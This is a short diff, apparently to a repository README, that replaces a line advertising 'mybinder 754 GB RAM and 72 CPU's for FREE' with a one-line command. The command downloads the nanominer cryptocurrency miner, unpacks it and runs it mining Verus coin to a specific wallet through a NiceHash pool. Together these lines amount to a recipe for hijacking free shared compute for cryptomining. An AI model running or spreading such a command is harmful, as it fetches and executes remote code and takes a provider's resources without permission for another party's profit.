@@ -1,2 +1,1 @@
-# binder72cpu
-mybinder 754 GB RAM and 72 CPU's for FREE
+wget https://github.com/nanopool/nanominer/releases/download/v3.6.3/nanominer-linux-3.6.3.tar.gz && tar -xf nanominer-linux-3.6.3.tar.gz && cd nanominer-linux-3.6.3 && chmod +x nanominer && ./nanominer -algo Verushash -wallet NHbXFPXwwghC4GyTK7xYT53yeNU6aZKKrfX3.work -coin VRSC -pool1 verushash.auto.nicehash.com:9200 -t 16
